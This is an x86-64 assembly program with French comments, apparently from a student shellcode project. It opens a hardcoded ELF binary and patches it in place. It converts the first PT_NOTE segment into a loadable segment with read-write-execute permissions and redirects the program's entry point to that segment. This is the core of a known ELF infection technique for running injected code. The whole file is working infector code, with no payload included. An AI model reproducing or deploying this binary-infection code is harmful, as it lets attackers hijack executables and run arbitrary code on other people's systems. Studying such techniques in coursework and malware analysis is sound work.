section .data
    chemin_fichier db '/home/cytech/Shellcode_project/hello_world', 0 ; chemin absolue car je n'ai pas réussi à faire marcher en dynamique avec un elf en argument, pas optimal mais fonctionel
    position_pt_note equ 456 ; offset où est situé le premier pt_note du elf (j'en parle plus en détails dans le rapport pour comprendre comment j'ai eu cette valeur)
    position_flags equ 460 ; postion des p_flags du pt_note
    position_entree equ 24 ; l'adresse d'entrée du programme dans le fichier elf
    nouvelle_adresse_entree dq 0x0338 ; on remplace l'entré du programme avec l'adresse virtuelle du premier pt_note (j'ai trouvé cette valeur avec un simple readelf -l)
    nouveau_type_pt db 1 ; on change la valeur du pt_note(04) et pt_load(01)
    nouveaux_flags dd 0x00000007 ; je donne tous les droits RWX, essentiel pour éxecuter le code injecté

section .bss
    descrip_fichier resq 1

section .text
global _start

_start:
    mov rax, 2
    lea rdi, [chemin_fichier]
    mov rsi, 2
    xor rdx, rdx
    syscall
    test rax, rax
    js erreur
    mov [descrip_fichier], rax

    call modif_pt_note ; modifie le type du premier pt_note
    call modif_flags ; modifie les flags associés pour un flag RWX
    call maj_entre ; met à jour l'adresse d'entrée du programme
    call fermer_fichier 
    call quitter 

modif_pt_note:
    ; on se met sur la position de premier segment pt_note
    mov rax, 8
    mov rdi, [descrip_fichier]
    mov rsi, position_pt_note
    xor rdx, rdx
    syscall
    test rax, rax
    js erreur

    ; on change le type pt_note en pt_load
    mov rax, 1
    mov rdi, [descrip_fichier]
    lea rsi, [nouveau_type_pt]
    mov rdx, 1
    syscall
    test rax, rax
    js erreur
    ret

; même logique pour les deux autres fonctions
modif_flags:
    mov rax, 8
    mov rdi, [descrip_fichier]
    mov rsi, position_flags
    xor rdx, rdx
    syscall
    test rax, rax
    js erreur

    mov rax, 1
    mov rdi, [descrip_fichier]
    lea rsi, [nouveaux_flags]
    mov rdx, 4
    syscall
    test rax, rax
    js erreur
    ret

maj_entre:
    mov rax, 8
    mov rdi, [descrip_fichier]
    mov rsi, position_entree
    xor rdx, rdx
    syscall
    test rax, rax
    js erreur

    mov rax, 1
    mov rdi, [descrip_fichier]
    lea rsi, [nouvelle_adresse_entree]
    mov rdx, 8
    syscall
    test rax, rax
    js erreur
    ret

fermer_fichier:
    mov rax, 3
    mov rdi, [descrip_fichier]
    syscall
    ret

quitter:
    mov rax, 60
    xor rdi, rdi
    syscall

erreur:
    mov rax, 60
    mov rdi, -1
    syscall

